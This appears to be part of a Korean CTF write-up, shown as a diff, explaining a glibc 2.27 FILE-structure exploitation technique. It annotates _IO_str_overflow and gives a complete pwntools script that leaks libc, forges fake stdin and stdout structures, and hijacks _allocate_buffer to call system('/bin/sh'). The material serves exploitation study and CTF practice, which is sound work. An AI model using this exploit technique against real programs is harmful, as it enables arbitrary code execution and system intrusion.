@@ -804,53 +804,168 @@ _IO_str_overflow (_IO_FILE *fp, int c)
       fp->_IO_read_ptr = fp->_IO_read_end;
     }
   pos = fp->_IO_write_ptr - fp->_IO_write_base;
-  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
+  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)) 
+    // #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
     {
       if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
-	return EOF;
-      else
+	    return EOF;
+  else  // 무조건 해당 분기로 들어와야함.
 	{
 	  char *new_buf;
 	  char *old_buf = fp->_IO_buf_base;
 	  size_t old_blen = _IO_blen (fp);
-	  _IO_size_t new_size = 2 * old_blen + 100;
+	  _IO_size_t new_size = 2 * old_blen + 100; // 해당 연산도 고려해줘야함.
 	  if (new_size < old_blen)
 	    return EOF;
 	  new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
-	  if (new_buf == NULL)
-	    {
-	      /*	  __ferror(fp) = 1; */
-	      return EOF;
-	    }
-	  if (old_buf)
-	    {
-	      memcpy (new_buf, old_buf, old_blen);
-	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
-	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
-	      fp->_IO_buf_base = NULL;
-	    }
-	  memset (new_buf + old_blen, '\0', new_size - old_blen);
-
-	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
-	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
-	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
-	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
-	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
-
-	  fp->_IO_write_base = new_buf;
-	  fp->_IO_write_end = fp->_IO_buf_end;
-	}
-    }
-
-  if (!flush_only)
-    *fp->_IO_write_ptr++ = (unsigned char) c;
-  if (fp->_IO_write_ptr > fp->_IO_read_end)
-    fp->_IO_read_end = fp->_IO_write_ptr;
-  return c;
+    /*
+      old_blen = fp->buf_end - fp->buf_base
+      new_size= 2 * (fp->buf_end - fp->buf_base) + 100
+      new_size must be greater than old_blen and be address of '/bin/sh'
+      If fp->buf_base is 0, fp-buf_end is ('/bin/sh' - 100) / 2 .
+    */
+    ...
+    ...
 }
 ```
 
 `new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);` 부분이 우리가 `system('/bin/sh')` 를 실행 시키기 위한 중요 도구가 될 것이다.
+
+인자로 들어간 fp 의 `_s._allocate_buffer` 의 주소가 `system` 함수 주소가 되고, `new_size` 인자가 `/bin/sh` 주소가 되면 쉘을 켤 수 있는 것이다.
+
+```c
+// glibc/libio/strfile.h:49
+
+struct _IO_streambuf
+{
+  FILE _f;
+  const struct _IO_jump_t *vtable;
+};
+typedef struct _IO_strfile_
+{
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;
+} _IO_strfile;
+```
+
+보다시피 해당 `_IO_strfile_` 구조체는 `_IO_FILE` 구조체와 **vtable** 을 나타내는 `_IO_jump_t` 구조체를 담고 있으므로 fp 인 **stdout** 은 조건에 맞게 **stdout** 과 **vtable** 을 overwrite 해놓고 그 다음에 `_s` 구조체를 `system` 함수로 구성해놓아야한다.
+
+아래는 payload 이다.
+
+```python
+#-*- coding:utf-8 -*-
+from pwn import *
+
+#context.log_level="debug"
+
+p=process("./chall",env={"LD_PRELOAD":"./libc-2.27.so"})
+libc=ELF("./libc-2.27.so")
+#libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+pause()
+def create1(alloc_size, read_size, data): # stdout is activated
+    p.recv()
+    p.sendline("1")
+    p.recv()
+    p.sendline(str(alloc_size))
+    p.recv()
+    p.sendline(str(read_size))
+    p.recv()
+    p.sendline(data)
+
+def create2(alloc_size, read_size, data): # stdout is deactivated
+    p.sendline("1")
+    p.sendline(str(alloc_size))
+    p.sendline(str(read_size))
+    p.sendline(data)
+
+# heap is allocated fixed addr
+
+# Overwrite LSB of '_IO_read_end' in `stdout`
+create1(0x200000,0x5ed761,"A")
+
+# Overwrite LSB of '_IO_write_base' in `stdout`
+create2(0x200000,0x5e6761+0x208010,"A")
+
+# libc base addr
+leak = u64(p.recvline()[8:14].ljust(8,b'\x00'))
+libc.address=leak-0x3ed8b0 # fixing libc base address *****
+
+# system('/bin/sh\x00')
+system=libc.sym['system']
+binsh=next(libc.search(b"/bin/sh"))
+
+# stdout, stdin FILE structure
+stdout=libc.sym['_IO_2_1_stdout_']
+stdin=libc.sym['_IO_2_1_stdin_']
+
+'''  These value are not in libc... so I extracted that manually.
+stdfile_lock=libc.sym['_IO_stdfile_1_lock']
+wide_data=libc.sym["_IO_wide_data_1"]
+io_str_jumps=libc.sym["_IO_str_jumps"]
+'''
+
+stdfile_lock=0x3ed8c0+libc.address
+wide_data=0x3eb8c0+libc.address
+io_str_jumps=0x3e8360+libc.address
+
+log.info("< LIBC leak in stdout's write_base overwritten with NULL byte in LSB > ")
+log.info(hex(leak))
+log.info("< LIBC base >")
+log.info(hex(libc.address))
+log.info("< system@LIBC >")
+log.info(hex(system))
+log.info("< /bin/sh >")
+log.info(hex(binsh))
+log.info("< stdout / stdin >")
+log.info("stdout => "+hex(stdout)+"\n"+"stdin => "+hex(stdin))
+
+create1(0x200000, 0x5e6761 + 0x208010 + 0x2002b8, "A")
+# Overwriting the `stdin` file structure
+fake2= p64(0xfbad208b) # _flags as they were before
+fake2+= p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
+fake2+= p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
+fake2+= p64(stdout) # _IO_buf_base, we are overwriting stdout
+fake2+= p64(stdout + 0x2000) # _IO_buf_end, we can overwrite 0x2000 bytes
+fake2=fake2.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`
+
+p.send(fake2)
+
+log.info("final set")
+p.recv()
+#overwriting the `stdout` file structure
+fake  = p64(0xfbad2084) # original _flags & ~_IO_USER_BUF
+fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
+fake += p64((binsh - 100) // 2) # _IO_write_ptr // ## [ 1 ]
+fake += p64(0) * 2 # _IO_write_end and _IO_buf_base // ## [ 2 ]
+fake += p64((binsh - 100) // 2) # _IO_buf_end // ## [ 3 ]
+fake += p64(0) * 4 # _IO_save_base to _markers
+fake += p64(stdin) # _chain
+fake += p32(1) # _fileno
+fake += p32(0) # _flags2
+fake += p64(0xffffffffffffffff) # _old_offset
+fake += p16(0) # _cur_column
+fake += p8(0) # _vtable_offset
+fake += b'\n' # _shortbuf
+fake += p32(0) # padding between shortbuf and _lock
+fake += p64(stdfile_lock) # _lock
+#fake+=p64(0)
+fake += p64(0xffffffffffffffff) # _offset
+fake += p64(0) # _codecvt
+fake += p64(wide_data) # _wide_data
+#fake+=p64(0)
+fake += p64(0) # _freeres_list
+fake += p64(0) #_freeres_buf
+fake += p64(0) #__pad5
+fake += p32(0xffffffff) # _mode
+fake += b'\0'*20 # _unused2
+fake += p64(io_str_jumps) # vtable // ## [ 4 ]
+fake += p64(system) # _s._allocate_buffer // ## [ 5 ]
+fake += p64(stdout) # _s._free_buffer
+
+p.sendline(fake)
+p.interactive()
+
+```
 
 
 
